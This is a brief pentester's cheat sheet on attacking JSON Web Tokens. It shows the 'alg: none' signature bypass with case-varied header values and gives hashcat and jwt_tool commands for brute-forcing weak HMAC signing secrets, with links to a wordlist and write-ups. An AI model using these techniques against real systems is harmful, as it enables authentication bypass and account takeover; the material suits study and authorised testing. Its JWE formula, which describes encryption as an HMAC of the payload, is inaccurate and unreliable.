
## JWT format:

`headers.payload.signature`

![[jwt_jwt-format.png]]

when the payload changes the signature is also altered accordingly 


## JWT vs JWS vs JWE

Three of 'em are almost similar, "JWT" almost always mean a "JWS" token
JWEs are very similar, except that the actual contents of the token are encrypted rather than just encoded.


JWT / JWS --> `base64(header) . base64(payload) . HMACSHA256( base64UrlEncode(header) + "." + base64UrlEncode(payload), <secretkey>)`


JWE --> `base64(header) . HMACSHA256( payload ) .  HMACSHA256( base64UrlEncode(header) + "." + base64UrlEncode(payload), <secretkey>)`


## Burp extension --> JWT Editor

[youtube.vid](https://youtu.be/nKmvKZHwf4s)


## Tokens with null signature (unsecured JWT)



```
HEADER
{ 
"alg": "NONE", 
"typ": "JWT" 
}

```
Obfuscating 

```
"alg": "none"
"alg": "NONE"
"Alg": "None"
"AlG": "nOnE"
"AlG": "NoNe"
```

PS: ==remove signature== part after changing algo to none

[ctf-writeup](https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771)

[hacker.recipe](https://www.thehacker.recipes/web/inputs/jwt)


## Brute-forcing weak secret keys


Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. These could easily be cracked by using the Old-fashion dictionary attack!

Using hashcat:

` hashcat -a 0 -m 16500 jwt_token secrets.list.txt --force `


Using jwt_tool"
` python3 jwt_tool.py <jwt_token.txt> -C -d secrets.list.txt `


[jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)


## JWT header parameter injections
